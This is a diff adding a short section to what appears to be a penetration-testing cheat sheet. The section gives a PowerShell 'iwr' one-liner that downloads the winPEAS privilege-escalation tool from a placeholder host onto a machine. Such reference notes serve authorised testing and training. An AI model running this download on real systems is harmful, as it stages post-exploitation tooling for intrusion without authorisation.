@@ -1135,6 +1135,17 @@ Usage-:```python mcafee_sitelist_pwd_decrypt.py <string>```
 
 ---------------
 
+### Copying files with powershell `iwr`
+
+----------------
+
+- Powershell `iwr`
+
+```pwsh
+iwr -uri http://x.x.x.x/winpeas.exe -Outfile winpeas.exe
+```
+
+---------------
 
   
 
